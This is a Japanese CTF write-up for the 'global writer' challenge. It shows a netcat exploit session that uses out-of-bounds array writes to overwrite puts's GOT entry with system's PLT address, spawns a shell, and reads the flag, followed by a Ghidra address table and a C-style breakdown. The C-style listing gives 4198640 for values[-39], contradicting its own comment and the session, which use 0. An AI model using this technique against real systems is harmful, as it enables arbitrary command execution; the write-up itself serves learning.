# global writer

## 解法

scanfが使われているのでバッファオーバーフローの問題かな？と考えました。しかし、単純に文字を多くするだけでは何も変わらなかったのでGeminiに聞きました。（悔しい）

```bash
nc 127.0.0.1 58554
index? > 0
value? > 1852400175
index? > 1
value? > 6845231
index? > -22
value? > 4210880
index? > -21
value? > 0
index? > -40
value? > 4198640
index? > -39
value? > 0
index? > -1
ls
chal
flag-8f81ce3b0214bc83bebe28a22669c050.txt
start.sh
cat flag-8f81ce3b0214bc83bebe28a22669c050.txt
TSGCTF{6O7_4nd_6lob4l_v4r1able5_ar3_4dj4c3n7_1n_m3m0ry_67216011}
```

## 解説

今回は```puts```の```GOT```を```system```の```PLT```に書き換え、```*msg```を```values```の先頭に書き換えることで、

```C
system("/bin/sh")
```
を実行してフラグを入手している。(GOT overwrite)

> 外部関数を呼び出す際、プログラムが最初に飛び込む「固定のジャンプ台」がPLTです。そこから、実際の関数の場所（ライブラリ内のアドレス）が書かれた「アドレス帳」であるGOTを参照することで、最終的な実行先に辿り着きます。

またGhidraでそれぞれのアドレスを調べると
| 16進 | 10進 | データ |
|---|---|---|
|0x00404068	|4210792	|msg_.data |
|0x00404020	|4210720	|puts_.got.plt |
|0x004010f0	|4198640	|system_.plt |
|0x004040c0	|4210880	|values.bss |

であり、更にソースコードに```-no-pie```をつけてコンパイルしているのでグローバル領域のオフセットは変化しない。したがって
```
&msg(.data) + 88バイト = &values(.bss)
&puts(.got.plt) + 160バイト = &values(.bss)
```
が成り立っている。配列の要素が4バイトなので-22がmsg、-40がputsである。

C風に書くと
```C
values[0] = "1852400175" // b'/bin'
values[1] = "6845231" // b'/sh'
values[-22] = 4210880 // msgの参照アドレス下位32bits。
values[-21] = 0 // アドレスは64bitsなので上位32bitsは0で上書き
values[-40] = 4198640 // systemのpltアドレス下位32bits。
values[-39] = 4198640 // 上位32bitsは0で上書き。
values[-1] // 発火
```
